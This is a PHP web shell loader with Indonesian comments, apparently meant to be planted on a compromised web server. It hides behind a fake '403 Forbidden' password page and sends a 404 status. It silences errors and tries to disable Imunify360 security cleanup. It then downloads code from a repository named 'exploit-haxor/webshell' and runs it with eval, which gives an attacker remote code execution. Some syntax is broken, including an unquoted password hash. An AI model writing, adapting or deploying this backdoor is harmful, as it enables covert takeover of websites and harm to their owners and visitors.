<?php
session_start();
ignore_user_abort(true);
ini_set('memory_limit', '-1');
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', 0);
ini_set('max_execution_time', 5000);
// Menggunakan password_hash dan password_verify untuk keamanan yang lebih baik
$hashed_password = $2y$10$toWDl83l9op/otBGo5fZoe383.B3lfkonRa2JWS1wnNY6i4koS7CO';

// Fungsi untuk menampilkan form login
function admin_login() {
    
}

if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
    // Memeriksa apakah password dikirim dan benar
    if(isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
        setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200); // Cookie berlaku selama 1 jam
        // Logika setelah login berhasil
    } else {
        admin_login();
    }
}
<!DOCTYPE html>
    <html>
    <head>
        <title>403 Forbidden</title>
    </head>
    <body>
      <style>
      body {
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: url('https://raw.githubusercontent.com/exploit-haxor/webshell/main/min') no-repeat center center fixed;
      background-size: cover;
      color: white;
      font-family: Arial, sans-serif;
      }
      
      form {
      background: transparent;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);  
      }
      
      label {
      display: block;
      margin-bottom: 10px;
      }
      
      input {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      box-sizing: border-box;
      border: 2px solid #f00;
      border-radius: 5px;
      background-color: transparent;
      color: #333;
      text-align: center;
      }
      
      input[type=\"submit\"] {
      color: white;
      cursor: pointer;
      }
      
      input[type=\"submit\"]:hover {
      background-color: black;
      }
      input[type=\"password\"]:hover {
      background-color: white;
      }
      </style>
      </head>
      <body>
<form method='post'>
            <input type='password' name='password'>
<input type='submit' value='Submit'>
          </form>
      </body>
      </html>";

    exit;
}    
error_reporting(0);
ini_set('lsapi_backend_off', '1');
ini_set("imunify360.cleanup_on_restore", false);
http_response_code(404);
$url = 'https://raw.githubusercontent.com/exploit-haxor/webshell/main/minnin';
$ohct = file_get_contents($url);
eval('?>' . $ohct);
?>
